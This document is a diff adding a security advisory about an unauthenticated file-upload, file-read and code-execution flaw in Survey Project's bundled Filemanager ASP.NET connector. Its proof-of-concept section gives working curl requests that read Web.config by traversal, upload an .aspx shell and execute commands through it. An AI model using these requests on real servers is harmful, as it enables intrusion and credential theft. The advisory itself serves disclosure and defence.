@@ -1,0 +1,184 @@
+Survey Project (NSurvey WebAdmin) - unauthenticated file upload, file read,
+file delete and remote code execution in the bundled Filemanager ASP.NET
+connector
+
+Advisory ID : SP-FM-2026-01
+Last updated: 2026-11-08
+Severity    : Critical
+CVSS 3.1    : 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
+CWE         : CWE-434, CWE-22, CWE-306, CWE-863
+Vendor      : Survey Project / W3DevPro
+Product     : Survey Project (NSurvey WebAdmin)
+Affected    : 2.2 Alpha, 2.2 Final, 2.3, 2.4, 2.4-DOI, 2.4-wpi, 2.5
+Status      : Unpatched; no CVE assigned yet
+
+
+1. SUMMARY
+
+Survey Project bundles an old ASP.NET connector for the CKEditor "Filemanager"
+plugin. The handler implements a mode switch (getinfo, getfolder, rename,
+delete, addfolder, download, add) and passes the request parameters path,
+currentpath, old, new and name directly into filesystem calls. It performs no
+authentication, authorization, session or role check.
+
+An unauthenticated remote attacker can:
+
+  - upload files with arbitrary extensions into any writable directory under
+    the application root; IIS executes uploaded .aspx files, which gives
+    remote code execution in the context of the application pool identity;
+  - read files under the application root, including Web.config with the
+    database connection strings in production deployments;
+  - delete files and directory trees;
+  - rename files and directories and create directories;
+  - bypass the URL authorization rules for XmlData and NSurveyAdmin, because
+    the handler reads the filesystem directly instead of going through the
+    ASP.NET request pipeline.
+
+
+2. AFFECTED VERSIONS
+
+  Release                 Handler path                                                Size / MD5
+  2.2 Alpha, 2.2 Final    /Filemanager/connectors/ashx/filemanager.ashx               14489 / e4bff7799e21360ddffe0ed85c9d8868
+  2.3                     /Scripts/ckeditor/Filemanager/connectors/ashx/filemanager.ashx  14489 / e4bff7799e21360ddffe0ed85c9d8868
+  2.4, 2.4-DOI            /Scripts/ckeditor/Filemanager/connectors/ashx/filemanager.ashx  14874 / 8dcb00d8e5cf4f0cd3dd6dd33ed45218
+  2.4-wpi                 /Scripts/ckeditor/Filemanager/connectors/ashx/filemanager.ashx  14874 / 8dcb00d8e5cf4f0cd3dd6dd33ed45218
+  2.5                     /Scripts/ckeditor/Filemanager/connectors/ashx/filemanager.ashx  14874 / 8dcb00d8e5cf4f0cd3dd6dd33ed45218
+
+Versions 2.0, 2.1 and 1.2.3 do not contain the connector. The 2.4-Turkish
+release is an XML language pack only, not an application distribution.
+
+Reachability:
+  - 2.2, 2.3, 2.4: the application root has no global authorization rule, so
+    the handler and an uploaded .aspx file are reachable anonymously.
+  - 2.5: the application root has <deny users="?"/>, but Scripts/web.config
+    has <allow users="*"/> for the Scripts tree, so the handler is still
+    anonymous and an uploaded .aspx placed in /Scripts (or /Images, /Content,
+    /fonts) executes. A shell uploaded to the root of a 2.5 deployment is
+    redirected to the login page.
+
+
+3. ROOT CAUSE
+
+The handler dispatches on the mode request parameter with no authorization
+check. The relevant branches, abridged:
+
+  case "download":
+      FileInfo fi = new FileInfo(context.Server.MapPath(context.Request["path"]));
+      context.Response.TransmitFile(fi.FullName);
+
+  case "delete":
+      Directory.Delete(HttpContext.Current.Server.MapPath(path), true);
+
+  case "add":
+      System.Web.HttpPostedFile file = context.Request.Files[0];
+      string path = context.Request["currentpath"];
+      file.SaveAs(context.Server.MapPath(
+          Path.Combine(path, Path.GetFileName(file.FileName))));
+
+The imgExtensions array in the file is used only by IsImage() to select preview
+icons; it is never applied to uploads.
+
+Server.MapPath rejects paths that escape above the application root for path
+and old. The new (rename) and name (addfolder) parameters are not normalized,
+so values containing .. or an absolute path may move or create files outside
+the application root, subject to filesystem permissions. This was found by
+source review and has not been executed against a live target.
+
+
+4. IMPACT
+
+Remote code execution as the application pool identity, disclosure of database
+credentials and configuration files, deletion of application files, and bypass
+of the application's own deny rules for XmlData and NSurveyAdmin.
+
+Uploading requires write permission for the pool identity in the target
+directory. That is the default in common deployments of this file-based
+application; the read and delete primitives require no write permission.
+
+
+5. PROOF OF CONCEPT
+
+The full script is poc_surveyproject_filemanager.py. It auto-detects both
+handler layouts and the ../ depth, is read-only by default, and deletes the
+shell it uploads. Use it only against systems you own or are explicitly
+authorized to test.
+
+  python3 poc_surveyproject_filemanager.py -u http://TARGET
+  python3 poc_surveyproject_filemanager.py -u http://TARGET --exploit --cmd whoami
+  python3 poc_surveyproject_filemanager.py -u http://TARGET --exploit --read ../../../../../Web.config
+
+Manual requests:
+
+  2.2:      /Filemanager/connectors/ashx/filemanager.ashx
+  2.3-2.5:  /Scripts/ckeditor/Filemanager/connectors/ashx/filemanager.ashx
+
+  # directory listing
+  curl -s "http://TARGET/Scripts/ckeditor/Filemanager/connectors/ashx/filemanager.ashx?mode=getfolder&path=/"
+
+  # read Web.config: 3 levels on 2.2, 5 levels on 2.3-2.5
+  curl -s "http://TARGET/Scripts/ckeditor/Filemanager/connectors/ashx/filemanager.ashx?mode=download&path=../../../../../Web.config"
+
+  # upload an .aspx shell
+  curl -s -F "file=@shell.aspx" "http://TARGET/Scripts/ckeditor/Filemanager/connectors/ashx/filemanager.ashx?mode=add&currentpath=/Scripts"
+
+  # execute
+  curl -s "http://TARGET/Scripts/shell.aspx?cmd=whoami"
+
+The add branch renders the result through a multi-line TextBox, so the response
+is a <textarea> containing HTML-encoded JSON rather than raw JSON.
+
+
+6. DETECTION
+
+Request ?mode=getfolder&path=/ on the handler paths above. A vulnerable
+instance returns HTTP 200 and a directory tree without a session cookie.
+
+Offline check:
+
+  md5sum Filemanager/connectors/ashx/filemanager.ashx
+  # 2.2 / 2.3: e4bff7799e21360ddffe0ed85c9d8868
+
+  md5sum Scripts/ckeditor/Filemanager/connectors/ashx/filemanager.ashx
+  # 2.4 / 2.4-DOI / 2.4-wpi / 2.5: 8dcb00d8e5cf4f0cd3dd6dd33ed45218
+
+
+7. MITIGATION
+
+  - Remove the Filemanager connector (Filemanager/ or
+    Scripts/ckeditor/Filemanager/) and the Filemanager browser if unused.
+  - Otherwise add an authorization check plus an extension and path allowlist
+    inside ProcessRequest, and restrict every mode to a dedicated
+    non-executable upload directory.
+  - Deny anonymous access to the Filemanager path. On 2.5 this must override
+    the <allow users="*"/> rule in Scripts/web.config.
+  - Block script extensions in the upload directory with IIS request filtering.
+  - Keep application-pool write access scoped to data directories, not the web
+    root.
+
+
+8. TIMELINE
+
+  2026-09-17  verified end-to-end against the official v2.4-DOI release on
+              IIS 10 / ASP.NET 4.0.30319.
+  2026-11-08  affected range re-verified from the release archives: 2.2
+              through 2.5; 2.0, 2.1 and 1.2.3 excluded.
+  2026-11-08  affected range re-verified; advisory and PoC prepared. CVE request pending.
+
+
+9. REFERENCES
+
+  - Survey Project releases:
+    https://github.com/surveyproject/surveyproject/releases
+  - Original component (ASP.NET connector discontinued after v0.8):
+    https://github.com/simogeo/Filemanager
+  - PHP-connector CVEs (distinct code): CVE-2025-46000, CVE-2025-46001,
+    CVE-2025-46002
+  - CWE-434: https://cwe.mitre.org/data/definitions/434.html
+  - CWE-306: https://cwe.mitre.org/data/definitions/306.html
+
+
+10. DISCLAIMER
+
+This advisory is provided for defensive and authorized testing purposes. Do not
+use the proof of concept against systems you do not own or lack permission to
+test.
